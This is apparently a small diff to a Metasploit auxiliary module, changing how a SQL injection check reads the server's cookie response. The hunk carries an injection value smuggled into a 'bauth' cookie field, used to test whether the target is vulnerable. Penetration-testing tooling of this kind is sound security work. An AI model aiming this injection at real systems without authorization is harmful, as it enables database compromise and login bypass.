@@ -99,7 +99,7 @@ class MetasploitModule < Msf::Auxiliary
         'cookie' => "bauth=' or #{payload}--"
       })
       fail_with 'Unable to connect to target' unless res
-      !res.headers['Set-Cookie'] # no Set-Cookie header means the session cookie is valid
+      res.get_cookies.empty? # no Set-Cookie header means the session cookie is valid
     end
     if @sqli.test_vulnerable
       Exploit::CheckCode::Vulnerable
